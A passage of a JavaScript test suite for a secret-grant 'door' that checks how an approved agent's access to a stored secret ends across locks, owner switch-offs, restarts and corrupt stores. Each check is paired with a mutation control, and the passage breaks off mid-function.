      const asideOf = () => fs.readdirSync(wc.dataDir).filter((n) => n.startsWith('vault-grant-ends.json.corrupt-'));
      const fileNow = () => { try { return JSON.parse(fs.readFileSync(f, 'utf8')).ends.length; } catch { return null; } };
      const qc = wc.door.request({ caller: c8, entry: M1, purpose: 'after the corrupt file' });
      wc.door.answerRequest(qc.askId, { answer: '8h', reauthed: true, person: true });
      for (const h of heldC.filter((x) => x.ms > 3600e3)) h.fn();
      for (let k = 0; k < 1000 && fileNow() === null; k++) await sleep(10);   // the next end handed to the writer (after the set-aside's rename) and landed — what both roads come to
      await SW.durable(f);
      const a = asideOf();
      return { asides: a.length, keptBytes: a.length === 1 && fs.readFileSync(path.join(wc.dataDir, a[0]), 'utf8') === bytes, fileNow: fileNow() };
    };
    const cr = await corruptLeg(DOOR);
    ok(cr.asides === 1 && cr.keptBytes && cr.fileNow === 1, `B-a14b: bytes that do not parse are set aside under a dated name (kept), the ends start empty and the next end is written fresh — ${JSON.stringify(cr)}`, cr);
    const mcr = M.load('src/server/vault-run-door.js', anchored(SRCa, '    const st = endsHold.start(a);', "    const st = endsHold.start(a.state === 'corrupt' ? { state: 'missing' } : a);", 'test-vault-run B-a14b: corrupt read as empty'), 'a14b-corrupt');
    const crr = await corruptLeg(mcr);
    ok(crr.asides === 0 && crr.fileNow === 1, `RED control: a corrupt ends file read as empty ⇒ its bytes written over by the next end (nothing set aside) — ${JSON.stringify(crr)}`, crr);
    // the fold's read: a PLANTED ends file — a record is kept WHOLE or not at all (a conversation past its bound is not loaded: cut,
    // it would sit under another conversation's key and show that conversation its words), and the purpose passes the request's
    // own belt BEFORE its cut (a value written into a purpose by hand never comes back from the file). REDs: the cut; no belt
    const TOKP = ['gh', 'p_zyxwvutsrqponmlkjihgfedcba9876543210'].join('');   // a token shape built at runtime (the secret scan)
    const plantLeg = async (mod) => {
      const wp = await world(), t0 = Date.now(), S = 'w'.repeat(200), cS = { ...c8, scope: S };
      const rec = (conv, purpose, endedBy) => ({ conv, id: 'mounts:m1#secretKey', endedAt: t0 - 60e3, endedBy, once: true, purpose, grantAt: t0 - 120e3 });
      fs.writeFileSync(path.join(wp.dataDir, 'vault-grant-ends.json'), JSON.stringify({ v: 1, ends: [rec(S, 'this conversation words', 'time'), rec(S + 'x', 'another conversation words', 'used'), rec(c8.scope, 'paste ' + TOKP + ' here', 'time')] }), { mode: 0o600 });
      wp.door = wp.mk(mod, { timers: { set: () => 0, clear: () => { } } });   // the start reads the planted file
      const mine8 = wp.door.usesFor(c8).ended[0] || {};
      return { listedS: wp.door.usesFor(cS).ended.map((e) => `${e.endedBy}:${e.purpose}`), valueBack: String(mine8.purpose || '').includes(TOKP), head8: String(mine8.purpose || '').slice(0, 6) };   // the value itself never printed
    };
    const pl = await plantLeg(DOOR);
    ok(pl.listedS.join('|') === 'time:this conversation words' && !pl.valueBack && pl.head8 === 'paste ', `the fold read: a planted ends file — a record past its bound not loaded (this conversation sees its own words only), a value in a purpose comes back belted — ${JSON.stringify(pl)}`, pl);
    const mpl = M.load('src/server/vault-run-door.js', anchored(SRCa, '    if (e.conv.length > 200 || e.id.length > 400) return null;', '    e.conv = e.conv.slice(0, 200); e.id = e.id.slice(0, 400);', 'test-vault-run the fold read: the cut'), 'a14b-plant-cut');
    const plr = await plantLeg(mpl);
    ok(plr.listedS.join('|') === 'used:another conversation words', `RED control: the record cut to its bound ⇒ another conversation's end sits under this one's key and says its words here — ${JSON.stringify(plr)}`, plr);
    const mpl2 = M.load('src/server/vault-run-door.js', anchored(SRCa, "purpose: SS.redactSecrets(String(e.purpose || '')).text.slice(0, 400),", "purpose: String(e.purpose || '').slice(0, 400),", 'test-vault-run the fold read: no belt'), 'a14b-plant-belt');
    const plr2 = await plantLeg(mpl2);
    ok(plr2.valueBack, `RED control: the loaded purpose without the belt ⇒ the value written into it comes back — ${JSON.stringify(plr2)}`, plr2);
    // …a store whose READ fails (no permission: mode 000) is HELD until the next start: the ends stay in memory, nothing is written
    // over it (src/store-read.js). RED: a held read that lets the writer write (the file replaced). Root reads a mode-000 file: SKIPPED there
    const heldLeg = async (mod) => {
      const wh = await world(), f = path.join(wh.dataDir, 'vault-grant-ends.json'), bytes = '{"v":1,"ends":[]}';
      fs.writeFileSync(f, bytes, { mode: 0o600 }); fs.chmodSync(f, 0o000);
      const heldH = [];
      wh.door = wh.mk(mod, { timers: { set: (fn, ms) => { heldH.push({ fn, ms }); return heldH.length; }, clear: () => { } } });
      const qh = wh.door.request({ caller: c8, entry: M1, purpose: 'past a held store' });
      wh.door.answerRequest(qh.askId, { answer: '8h', reauthed: true, person: true });
      for (const h of heldH.filter((x) => x.ms > 3600e3)) h.fn();
      await SW.durable(f);
      const st = fs.statSync(f);
      const out = { listed: wh.door.usesFor(c8).ended.length, modeKept: (st.mode & 0o777) === 0, sizeKept: st.size === bytes.length };
      fs.chmodSync(f, 0o600);
      return out;
    };
    if (process.getuid && process.getuid() === 0) console.log('  – B-a14b held store SKIPPED: running as root (root reads a mode-000 file)');
    else {
      const hl = await heldLeg(DOOR);
      ok(hl.listed === 1 && hl.modeKept && hl.sizeKept, `B-a14b: an ends store whose read fails is HELD — the end said from memory, the file never written over — ${JSON.stringify(hl)}`, hl);
      const mhl = M.load('src/server/vault-run-door.js', anchored(SRCa, '    const st = endsHold.start(a);', "    const st = endsHold.start(a.state === 'unreadable' ? { state: 'missing' } : a);", 'test-vault-run B-a14b: a held read written over'), 'a14b-held');
      const hlr = await heldLeg(mhl);
      ok(!hlr.modeKept, `RED control: a held read that lets the writer write ⇒ the unreadable file replaced — ${JSON.stringify(hlr)}`, hlr);
    }
    // wl932b4e8 (主开发 r750) 3a: «used» is DATED AT THE SPEND — on the door's own clock the run takes the grant a minute after the
    // approval, and the 8-hour timer (held by the leg, fired by hand an hour after the spend) ends it: the end's instant is the
    // spend's, never the approval's or the timer's. REDs: the end dated at the timer; dated at the approval (the fold's read)
    let heldPid = 0;
    const runHeld = async (wl, beforeRun = () => { }) => {
      const ql = wl.door.request({ caller: c8, entry: M1, purpose: 'one long upload' });
      wl.door.answerRequest(ql.askId, { answer: 'once', reauthed: true, person: true });
      beforeRun();   // (the dated leg moves the door's clock here: the approval's instant is not the spend's)
      const ac = new AbortController(), pidF = path.join(wl.work, `held-${++heldPid}.pid`);
      const pr = wl.door.run({ caller: c8, args: ['--env', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'sleep', pidF], cwd: wl.work, signal: ac.signal });
      const c0 = await waitCard(wl); if (c0) wl.door.answer(c0.action.askId, { answer: 'once' });
      for (let k = 0; k < 1000 && !fs.existsSync(pidF); k++) await sleep(10);   // the child RAN — the grant is spent
      return { ac, pr, running: fs.existsSync(pidF) };
    };
    const datedLeg = async (mod) => {
      const wd = await world(), heldD = [], clk = { t: Date.now() };
      wd.door = wd.mk(mod, { now: () => clk.t, timers: { set: (fn, ms) => { heldD.push({ fn, ms }); return heldD.length; }, clear: () => { } } });
      const approvedAt = clk.t; let spentAt = null;
      const h = await runHeld(wd, () => { clk.t += 60e3; spentAt = clk.t; });   // a minute after the approval the run takes it
      clk.t += 3600e3;   // an hour after the spend on the door's clock: the leg fires the 8-hour timer it holds
      for (const x of heldD.filter((y) => y.ms > 3600e3)) x.fn();
      const e = wd.door.usesFor(c8).ended[0] || {};
      h.ac.abort(); await h.pr;
      return { running: h.running, endedBy: e.endedBy || null, endedAt: e.endedAt ? Date.parse(e.endedAt) : null, approvedAt, spentAt, timerAt: clk.t };
    };
    const dl = await datedLeg(DOOR);
    ok(dl.running && dl.endedBy === 'used' && dl.endedAt === dl.spentAt && dl.endedAt > dl.approvedAt && dl.endedAt < dl.timerAt, `wl932b4e8: «used» is DATED AT THE SPEND (the run's instant — after the approval's, before the timer's) — ${JSON.stringify(dl)}`, dl);
    const mdl = M.load('src/server/vault-run-door.js', anchored(SRCa, "endedBy === 'used' && g && g.spentAt ? g.spentAt : ", '', 'test-vault-run wl932b4e8: «used» dated at the timer'), 'a14b-dated');
    const dlr = await datedLeg(mdl);
    ok(dlr.running && dlr.endedBy === 'used' && dlr.endedAt === dlr.timerAt, `RED control: «used» dated at the timer ⇒ the end says the run used it an hour after it did — ${JSON.stringify(dlr)}`, dlr);
    const mdl2 = M.load('src/server/vault-run-door.js', anchored(SRCa, "endedBy === 'used' && g && g.spentAt ? g.spentAt : ", "endedBy === 'used' && g && g.spentAt ? g.at : ", 'test-vault-run the fold read: «used» dated at the approval'), 'a14b-dated-at');
    const dlr2 = await datedLeg(mdl2);
    ok(dlr2.running && dlr2.endedBy === 'used' && dlr2.endedAt === dlr2.approvedAt && dlr2.endedAt !== dlr2.spentAt, `RED control: «used» dated at the approval ⇒ the end says a minute before the run took it — ${JSON.stringify(dlr2)}`, dlr2);
    // 3b: a BURNED run (nothing ran — its run directory cannot be made: the run root a folder never made, for that one run ⇒
    // spawn_failed, after the spend; judged as root too) clears the mark — the once-grant given back carries no «spent» (judged on the
    // grant itself; the timer's end said as a fact). RED: the mark kept — its timer would say «used» for a run that never ran
    const burnedLeg = async (mod) => {
      const wb2 = await world(), heldB2 = []; let burn = false;
      wb2.door = wb2.mk(mod, { runRoot: () => (burn ? path.join(wb2.dir, 'run-never-made') : wb2.runRoot), timers: { set: (fn, ms) => { heldB2.push({ fn, ms }); return heldB2.length; }, clear: () => { } } });
      const qb2 = wb2.door.request({ caller: c8, entry: M1, purpose: 'a run that burns' });
      wb2.door.answerRequest(qb2.askId, { answer: 'once', reauthed: true, person: true });
      burn = true;
      const code = (await runAnswered(wb2, ENV('env'), { caller: c8 })).r.code;
      burn = false;
      const back = [...wb2.door._grants.values()].filter((g) => g.conv === c8.scope && g.once);   // the once-grant the burned run gave back
      const mark = back.map((g) => ({ spent: g.spent === true, spentAt: g.spentAt != null }));
      for (const x of heldB2.filter((y) => y.ms > 3600e3)) x.fn();
      return { code, givenBack: back.length === 1, mark, endedBy: (wb2.door.usesFor(c8).ended[0] || {}).endedBy || null };   // endedBy: a fact said, the mark is what is judged
    };
    {
      const bl = await burnedLeg(DOOR);
      ok(bl.code === 'spawn_failed' && bl.givenBack && bl.mark.length === 1 && !bl.mark[0].spent && !bl.mark[0].spentAt, `wl932b4e8: a BURNED run clears the mark — the once-grant given back carries no «spent» (its 8 hours would end «time») — ${JSON.stringify(bl)}`, bl);
      const mbl = M.load('src/server/vault-run-door.js', anchored(SRCa, 'if (burned) for (const a of spent) { a.g.spent = false; delete a.g.spentAt; }', 'if (false) { }', 'test-vault-run wl932b4e8: the mark kept'), 'a14b-burned');
      const blr = await burnedLeg(mbl);
      ok(blr.givenBack && blr.mark.length === 1 && blr.mark[0].spent && blr.mark[0].spentAt, `RED control: the mark kept on a burned run ⇒ the given-back grant still says «spent» (its timer would say «used» for a run that never ran) — ${JSON.stringify(blr)}`, blr);
    }
    // the fold's read: a BURNED run the vault's LOCK crosses (the lock lands after the spend, inside the run — at its run root's
    // reading — and the run directory cannot be made ⇒ spawn_failed): the grant is not given back (never across a lock) and it ENDS
    // «lock», as each grant the lock ended: its For-you record and `uses` say so, DATED AT THE LOCK (the door's clock moves a second
    // past the approval before the lock and five past the lock before the burn comes back — round w2ipz7162 + the follow's read).
    // REDs: no end at all (the record kept «allowed once»); dated at the burn
    const burnedLock = async (mod) => {
      const wk = await world(), clk = { t: Date.now() }; let armed = false, atLock = null;
      wk.door = wk.mk(mod, { now: () => clk.t, runRoot: () => { if (!armed) return wk.runRoot; armed = false; clk.t += 1000; atLock = { spent: ![...wk.door._grants.values()].some((g) => g.conv === c8.scope && g.once), lockClock: clk.t }; wk.door.onLocked('test'); clk.t += 5000; atLock.burnClock = clk.t; return path.join(wk.dir, 'run-never-made'); } });
      const qk = wk.door.request({ caller: c8, entry: M1, purpose: 'a run the lock crosses' });
      wk.door.answerRequest(qk.askId, { answer: 'once', reauthed: true, person: true });
      const g = [...wk.door._grants.values()].find((x) => x.conv === c8.scope && x.once), todoId = g ? g.todoId : null;
      armed = true;
      const r = (await runAnswered(wk, ENV('env'), { caller: c8 })).r;
      const it = todoId ? wk.userTodos.get(todoId) : null;
      return { code: r.code, todo: !!todoId, lockAfterSpend: !!(atLock && atLock.spent), givenBack: [...wk.door._grants.values()].some((x) => x.conv === c8.scope && x.once), recordEnd: (it && it.resolvedFact && it.resolvedFact.endedBy) || null, recordAtLock: !!(it && it.resolvedFact && atLock && it.resolvedFact.endedAt === atLock.lockClock), recordAtBurn: !!(it && it.resolvedFact && atLock && it.resolvedFact.endedAt === atLock.burnClock), recordClock: it && it.resolvedFact ? it.resolvedFact.endedAt : null, lockClock: atLock ? atLock.lockClock : null, burnClock: atLock ? atLock.burnClock : null, listed: wk.door.usesFor(c8).ended.map((e) => e.endedBy) };
    };
    const bk = await burnedLock(DOOR);
    ok(bk.code === 'spawn_failed' && bk.todo && bk.lockAfterSpend && !bk.givenBack && bk.recordEnd === 'lock' && bk.recordAtLock && bk.listed.includes('lock'), `the fold read: a burned run the lock crosses ENDS «lock» — not given back; its For-you record (dated at the lock) and \`uses\` say the lock — ${JSON.stringify(bk)}`, bk);
    const mbk2 = M.load('src/server/vault-run-door.js', anchored(SRCa, "lockT = lockGen !== lg0 ? lockedAt : now();", 'lockT = now();', 'test-vault-run follow: the lock end dated at the burn'), 'a14b-lock-dated');
    const bkr2 = await burnedLock(mbk2);
    ok(bkr2.recordEnd === 'lock' && !bkr2.recordAtLock && bkr2.recordAtBurn, `RED control: the lock end dated at the burn ⇒ the record says the grant ended five seconds after the lock did — ${JSON.stringify(bkr2)}`, bkr2);
    const mbk = M.load('src/server/vault-run-door.js', anchored(SRCa, "else if (!open) grantEnded(a.g, 'lock', lockT); else if (a.g.until > now())", 'else if (open && a.g.until > now())', 'test-vault-run the fold read: no end across a lock'), 'a14b-burned-lock');
    const bkr = await burnedLock(mbk);
    ok(bkr.code === 'spawn_failed' && bkr.todo && bkr.lockAfterSpend && !bkr.givenBack && bkr.recordEnd === null, `RED control: no end for a burned run across a lock ⇒ its For-you record keeps «allowed once» with no end — ${JSON.stringify(bkr)}`, bkr);
    // r901 (1): a BURNED run the owner's OFF crosses (the OFF lands after the spend, inside the run — at its run root's reading — and
    // the run directory is never made ⇒ spawn_failed): the grant is NOT given back (never after the owner's OFF) and it ENDS
    // «revoked» DATED AT THE OFF, as each grant the OFF ended (its For-you record says so). With a LOCK in the same window the FIRST
    // of the two is its end (the first end stands, as for a live grant); an OFF BEFORE the approval is not the news — that grant comes
    // back. REDs: the give-back that reads the lock alone (the release); dated at the burn; the lock read first; the OFF read alone;
    // an OFF at any time read as after the approval
    const offBurn = async (mod, { order = 'off' } = {}) => {
      const wf = await world(), clk = { t: Date.now() }; let armed = false, atOff = null;
      const offNow = () => { const o = wf.door.setRunnable({ id: 'mounts:m1#secretKey', on: false }); return o && o.ok === false ? o.code : 'ok'; };
      wf.door = wf.mk(mod, { now: () => clk.t, runRoot: () => {
        if (!armed) return wf.runRoot;
        armed = false; clk.t += 1000;
        atOff = { spent: ![...wf.door._grants.values()].some((g) => g.conv === c8.scope && g.once) };
        if (order === 'lockOff') { atOff.lockClock = clk.t; wf.door.onLocked('test'); clk.t += 1000; }
        if (order !== 'offBefore') { atOff.offClock = clk.t; atOff.off = offNow(); }
        if (order === 'offLock') { clk.t += 1000; atOff.lockClock = clk.t; wf.door.onLocked('test'); }
        clk.t += 5000; atOff.burnClock = clk.t;
        return path.join(wf.dir, 'run-never-made');
      } });
      const before = order === 'offBefore' ? offNow() : null;   // the owner's OFF of the closed entry, a second BEFORE the approval
      if (order === 'offBefore') clk.t += 1000;
      const qf = wf.door.request({ caller: c8, entry: M1, purpose: 'a run the OFF crosses' });
      wf.door.answerRequest(qf.askId, { answer: 'once', reauthed: true, person: true });
      const g = [...wf.door._grants.values()].find((x) => x.conv === c8.scope && x.once), todoId = g ? g.todoId : null;
      armed = true;
      const r = (await runAnswered(wf, ENV('env'), { caller: c8 })).r;
      const it = todoId ? wf.userTodos.get(todoId) : null, f = it && it.resolvedFact ? it.resolvedFact : null;
      const k = atOff || {};
      return { order, code: r.code, todo: !!todoId, before, off: k.off || null, offAfterSpend: !!k.spent, givenBack: [...wf.door._grants.values()].some((x) => x.conv === c8.scope && x.once), recordEnd: (f && f.endedBy) || null,
        recordAtOff: !!(f && k.offClock != null && f.endedAt === k.offClock), recordAtLock: !!(f && k.lockClock != null && f.endedAt === k.lockClock), recordAtBurn: !!(f && k.burnClock != null && f.endedAt === k.burnClock),
        recordClock: f ? f.endedAt || null : null, offClock: k.offClock || null, lockClock: k.lockClock || null, burnClock: k.burnClock || null };
    };
    const ob = await offBurn(DOOR);
    ok(ob.code === 'spawn_failed' && ob.todo && ob.off === 'ok' && ob.offAfterSpend && !ob.givenBack && ob.recordEnd === 'revoked' && ob.recordAtOff, `r901: a burned run the owner's OFF crosses is NOT given back — it ends «revoked» at the OFF, as each grant the OFF ended — ${JSON.stringify(ob)}`, ob);
    const mob = M.load('src/server/vault-run-door.js', anchored(SRCa, "if (offT && (open || offT <= lockT)) grantEnded(a.g, 'revoked', offT); else ", '', 'test-vault-run follow: the give-back reads the lock alone'), 'a14b-off-burn');
    const obr = await offBurn(mob);
    ok(obr.code === 'spawn_failed' && obr.offAfterSpend && obr.givenBack && obr.recordEnd === null, `RED control: the give-back that reads the lock alone ⇒ the once-grant comes back after the owner's OFF — ${JSON.stringify(obr)}`, obr);
    const mob2 = M.load('src/server/vault-run-door.js', anchored(SRCa, "grantEnded(a.g, 'revoked', offT);", "grantEnded(a.g, 'revoked');", 'test-vault-run follow: «revoked» dated at the burn'), 'a14b-off-dated');
    const obr2 = await offBurn(mob2);
    ok(obr2.recordEnd === 'revoked' && !obr2.recordAtOff && obr2.recordAtBurn, `RED control: «revoked» dated at the burn ⇒ the record says the grant ended five seconds after the OFF did — ${JSON.stringify(obr2)}`, obr2);
    const ol = await offBurn(DOOR, { order: 'offLock' });
    ok(ol.code === 'spawn_failed' && ol.off === 'ok' && ol.offAfterSpend && !ol.givenBack && ol.recordEnd === 'revoked' && ol.recordAtOff, `the follow's read: an OFF and then a LOCK in one burned run's window ⇒ the OFF is its end («revoked» at the OFF — the first end stands, as for a live grant) — ${JSON.stringify(ol)}`, ol);
    const mol = M.load('src/server/vault-run-door.js', anchored(SRCa, "if (offT && (open || offT <= lockT))", 'if (offT && open)', 'test-vault-run follow: the lock read first'), 'a14b-off-lock');
    const olr = await offBurn(mol, { order: 'offLock' });
    ok(olr.recordEnd === 'lock', `RED control: the lock read first ⇒ an OFF that came before the lock is said as the lock — ${JSON.stringify(olr)}`, olr);
    const lo2 = await offBurn(DOOR, { order: 'lockOff' });
    ok(lo2.code === 'spawn_failed' && lo2.off === 'ok' && lo2.offAfterSpend && !lo2.givenBack && lo2.recordEnd === 'lock' && lo2.recordAtLock, `the narrow read: a LOCK and then an OFF in that window ⇒ the lock is its end («lock» at the lock) — ${JSON.stringify(lo2)}`, lo2);
    const mlo2 = M.load('src/server/vault-run-door.js', anchored(SRCa, "if (offT && (open || offT <= lockT))", 'if (offT)', 'test-vault-run follow: the OFF read alone'), 'a14b-lock-off');
    const lor2 = await offBurn(mlo2, { order: 'lockOff' });
    ok(lor2.recordEnd === 'revoked', `RED control: the OFF read alone ⇒ an OFF that came after the lock is said as the end — ${JSON.stringify(lor2)}`, lor2);
    const oa = await offBurn(DOOR, { order: 'offBefore' });
    ok(oa.code === 'spawn_failed' && oa.before === 'ok' && oa.offAfterSpend && oa.givenBack && oa.recordEnd === null, `the narrow read: an OFF BEFORE the approval is not the news — the burned run's once-grant comes back, nothing ended — ${JSON.stringify(oa)}`, oa);
    const moa = M.load('src/server/vault-run-door.js', anchored(SRCa, 'if (o && o >= since && o > t) t = o;', 'if (o && o >= 0 && o > t) t = o;', 'test-vault-run follow: any OFF read as after the approval'), 'a14b-off-before');
    const oar = await offBurn(moa, { order: 'offBefore' });
    ok(oar.code === 'spawn_failed' && !oar.givenBack && oar.recordEnd === 'revoked', `RED control: an OFF at any time read as after the approval ⇒ a grant given after the OFF is never given back — ${JSON.stringify(oar)}`, oar);
    // the follow's read: a LATE «allow once» pass (an expired run card the owner still allowed) — (a) the owner's OFF takes it back
    // (as it takes back every «always» and seen shape — never outliving its switch); (b) one a run TOOK is never given back after an
    // OFF during that run (the OFF placed at the run root's reading, the run burned); (c) an OFF and an ON BEFORE the pass was minted
    // are not the news — the burned run gives that pass back. REDs: the OFF keeps the pass; the late give-back that reads the lock
    // alone; any OFF read as during the run
    const lateOff = async (mod, { inRun = false, offBefore = false } = {}) => {
      const wq = await world({ instance: 'cluster', askMs: 40 }); let armed = false, atOff = null;
      wq.door = wq.mk(mod, { runRoot: () => { if (!armed) return wq.runRoot; armed = false; atOff = { taken: wq.door._lateOnce.size === 0 }; if (!offBefore) wq.door.setRunnable({ id: 'mounts:m1#secretKey', on: false }); return path.join(wq.dir, 'run-never-made'); } });
      openRow(wq);
      if (offBefore) { wq.door.setRunnable({ id: 'mounts:m1#secretKey', on: false }); openRow(wq); }   // an OFF and an ON before the pass is minted
      const a1 = await runAnswered(wq, ENV('env'), { answer: null }); await a1.r;   // its card expires unanswered ⇒ a late card
      const lc = cardsOf(wq)[0]; if (lc) wq.door.answer(lc.action.askId, { answer: 'once' });   // the owner allows it late ⇒ ONE pass
      const passes = wq.door._lateOnce.size;
      if (!inRun) { wq.door.setRunnable({ id: 'mounts:m1#secretKey', on: false }); return { lateCard: !!lc, passes, afterOff: wq.door._lateOnce.size }; }
      armed = true;
      const r = await wq.door.run({ caller: wq.caller, args: ENV('env'), cwd: wq.work });   // the pass's own command: taken at the verdict, then burned
      return { offBefore, lateCard: !!lc, passes, code: r.code, offAfterTake: !!(atOff && atOff.taken), afterRun: wq.door._lateOnce.size };
    };
    const lo = await lateOff(DOOR);
    ok(lo.lateCard && lo.passes === 1 && lo.afterOff === 0, `the follow's read: the owner's OFF takes back a late «allow once» pass naming the entry — ${JSON.stringify(lo)}`, lo);
    const mlo = M.load('src/server/vault-run-door.js', anchored(SRCa, "    if (!on) for (const [pair, lp] of [...lateOnce]) if (lp && (lp.entries || []).includes(key)) lateOnce.delete(pair);", '', 'test-vault-run follow: the OFF keeps a late pass'), 'a14b-late-off');
    const lor = await lateOff(mlo);
    ok(lor.passes === 1 && lor.afterOff === 1, `RED control: an OFF that keeps the late pass ⇒ after an ON the exact command would run once with no card — ${JSON.stringify(lor)}`, lor);
    const li = await lateOff(DOOR, { inRun: true });
    ok(li.lateCard && li.passes === 1 && li.code === 'spawn_failed' && li.offAfterTake && li.afterRun === 0, `the follow's read: a late pass a burned run took is never given back after the owner's OFF during that run — ${JSON.stringify(li)}`, li);
    const mli = M.load('src/server/vault-run-door.js', anchored(SRCa, " && !offTimeOf(lateConsumed.lp, t0)) {", ') {', 'test-vault-run follow: the late give-back reads the lock alone'), 'a14b-late-back');
    const lir = await lateOff(mli, { inRun: true });
    ok(lir.code === 'spawn_failed' && lir.offAfterTake && lir.afterRun === 1, `RED control: the late give-back that reads the lock alone ⇒ the pass comes back after the owner's OFF — ${JSON.stringify(lir)}`, lir);
    const lb = await lateOff(DOOR, { inRun: true, offBefore: true });
    ok(lb.lateCard && lb.passes === 1 && lb.code === 'spawn_failed' && lb.offAfterTake && lb.afterRun === 1, `the narrow read: an OFF and an ON BEFORE the pass was minted are not the news — the burned run gives the late pass back — ${JSON.stringify(lb)}`, lb);
    const mlb = M.load('src/server/vault-run-door.js', anchored(SRCa, " && !offTimeOf(lateConsumed.lp, t0)) {", ' && !offTimeOf(lateConsumed.lp, 0)) {', 'test-vault-run follow: any OFF read as during the run'), 'a14b-late-before');
    const lbr = await lateOff(mlb, { inRun: true, offBefore: true });
    ok(lbr.code === 'spawn_failed' && lbr.offAfterTake && lbr.afterRun === 0, `RED control: any OFF read as during the run ⇒ a pass minted after an old OFF is never given back — ${JSON.stringify(lbr)}`, lbr);
    // 4: THE SCENE THE RECORD-TIME OFF SKIP EXISTS FOR — a once-grant a run spent, the owner's OFF while it runs (a second after the
    // approval on the door's clock), the run ends («used»), then a NEW door over the same data (a restart: the OFF's time is memory):
    // the end is not said. RED: the skip taken away — the end recorded, said after the restart over the owner's OFF
    const offRestart = async (mod) => {
      const wo2 = await world(), heldO2 = [], clk = { t: Date.now() };
      wo2.door = wo2.mk(mod, { now: () => clk.t, timers: { set: (fn, ms) => { heldO2.push({ fn, ms }); return heldO2.length; }, clear: () => { } } });
      const h = await runHeld(wo2);
      clk.t += 1000;
      wo2.door.setRunnable({ id: 'mounts:m1#secretKey', on: false });   // the owner's OFF, AFTER the approval, while the run runs
      h.ac.abort(); await h.pr;   // the run ends: the spent grant's end is «used»
      await SW.durable(path.join(wo2.dataDir, 'vault-grant-ends.json'));
      wo2.door = wo2.mk(mod, { timers: { set: () => 0, clear: () => { } } });   // THE RESTART
      return { running: h.running, afterRestart: wo2.door.usesFor(c8).ended.map((e) => e.endedBy) };
    };
    const orr = await offRestart(DOOR);
    ok(orr.running && orr.afterRestart.length === 0, `wl932b4e8: an end after the owner's OFF of an approval given before it is never recorded — a restart says nothing over the OFF — ${JSON.stringify(orr)}`, orr);
    const mor = M.load('src/server/vault-run-door.js', anchored(anchored(SRCa, "      if (offAt.has(id) && (offAt.get(id) || 0) >= (Number(g.at) || 0)) continue;", '', 'test-vault-run wl932b4e8: no record-time OFF skip'), '  const offSinceOf = (d, id) => Math.max(offAt.get(id) || 0, d && d.touched ? Number(d.touched[id]) || 0 : 0);', '  const offSinceOf = (d, id) => offAt.get(id) || 0;', 'test-vault-run B-a14b remainder: and the OFF from memory alone'), 'a14b-offskip');   // B-a14b's remainder: the persisted toggle hides that end too now — each guard alone keeps the OFF the news, so the RED takes both
    const orrR = await offRestart(mor);
    ok(orrR.running && orrR.afterRestart.join() === 'used', `RED control: no record-time OFF skip AND the OFF read from memory alone ⇒ after a restart the end is said over the owner's OFF (its time forgotten) — ${JSON.stringify(orrR)}`, orrR);
    // B-a14b's remainder (主开发 r1482): A RESTART ENDS a live approval (the vault locks at each start) — and the AGENT is told: a
    // new door over the same data (the restart) lists the end «restart» in `uses` and refuses the next run grant_expired with the
    // restart in its words (it read entry_not_runnable — «not switched on» — before); its For-you record says «restart»; a record
    // from before (no conversation / entry in its facts) is ended on the record only. RED: the start writes no end
    const restartEnds = async (mod, { old = false } = {}) => {
      const ws = await world();
      ws.door = ws.mk(mod, { timers: { set: () => 0, clear: () => { } } });
      const qs = ws.door.request({ caller: c8, entry: M1, purpose: 'a restart in between' });
      const ans = ws.door.answerRequest(qs.askId, { answer: '8h', reauthed: true, person: true });   // live for 8 hours
      const g = [...ws.door._grants.values()].find((x) => x.conv === c8.scope), todoId = g ? g.todoId : null;
      const it0 = todoId ? ws.userTodos.get(todoId) : null, f0 = (it0 && it0.resolvedFact) || {};
      const facts = { conv: f0.conv === c8.scope, entry: f0.entry === 'mounts:m1#secretKey', purpose: f0.purpose === 'a restart in between' };
      if (old && it0 && it0.resolvedFact) { delete it0.resolvedFact.conv; delete it0.resolvedFact.entry; }   // a record written before this release
      const liveEnded = ws.door.usesFor(c8).ended.length;
      ws.door = ws.mk(mod, { timers: { set: () => 0, clear: () => { } } });   // THE RESTART: a new door over the same data (its grants were memory)
      const recEnd = () => { const x = todoId ? ws.userTodos.get(todoId) : null; return (x && x.resolvedFact && x.resolvedFact.endedBy) || null; };
      for (let k = 0; k < 200 && !recEnd(); k++) await new Promise((r) => setImmediate(r));   // the start's sweep has run: the record says how it ended
      const e0 = ws.door.usesFor(c8).ended[0] || null;
      const ra = await runAnswered(ws, ENV('env'), { caller: c8 });
      return { answered: !!(ans && ans.ok), facts, liveEnded, afterRestart: e0 ? { endedBy: e0.endedBy, purpose: e0.purpose, entry: e0.entry } : null, code: ra.r.code, card: !!ra.card, restartWords: typeof ra.r.words === 'string' && /the hub restarted at \d{4}-\d\d-\d\d \d\d:\d\d UTC/.test(ra.r.words), recordEnd: recEnd() };
    };
    const rse = await restartEnds(DOOR);
    ok(rse.answered && rse.facts.conv && rse.facts.entry && rse.facts.purpose && rse.liveEnded === 0 && rse.afterRestart && rse.afterRestart.endedBy === 'restart' && rse.afterRestart.purpose === 'a restart in between' && rse.afterRestart.entry === M1 && rse.code === 'grant_expired' && rse.restartWords && rse.recordEnd === 'restart',
      `B-a14b's remainder: a RESTART ends a live approval and the agent is told — \`uses\` lists «restart», the next run is refused grant_expired saying the hub restarted, the record says so — ${JSON.stringify(rse)}`, rse);
    const mrse = M.load('src/server/vault-run-door.js', anchored(SRCa, " if (keyed) noteEnded({ conv: f.conv, entries: [f.entry], once: f.grantedFor === 'once', at: Number(f.at) || 0, purpose: SS.redactSecrets(typeof f.purpose === 'string' ? f.purpose : '').text.slice(0, 400) }, 'restart', t0);", '', 'test-vault-run B-a14b remainder: the start writes no end'), 'a14b-restart');
    const rser = await restartEnds(mrse);
    ok(rser.recordEnd === 'restart' && !rser.afterRestart && rser.code !== 'grant_expired', `RED control: the start writes no end (the release) ⇒ \`uses\` silent after a restart and the run refused as ${rser.code} — never «your approval ended» — ${JSON.stringify(rser)}`, rser);
    const rso = await restartEnds(DOOR, { old: true });
    ok(rso.recordEnd === 'restart' && !rso.afterRestart, `B-a14b's remainder: a record from before (no conversation / entry in its facts) is ended on the record only — nothing written for an entry it cannot name — ${JSON.stringify({ recordEnd: rso.recordEnd, afterRestart: rso.afterRestart })}`, rso);
    // the read: an OFF while a spent once-grant's run RUNS, then a RESTART before that run ends (its record still reads live): the
    // restart's end must not be said over the owner's OFF — the persisted toggle is the OFF's time. RED: the OFF read from memory
    // alone (gone at the restart) ⇒ «the hub restarted … it already was when they approved», false
    const offThenRestart = async (mod) => {
      const wq = await world(), clk = { t: Date.now() };
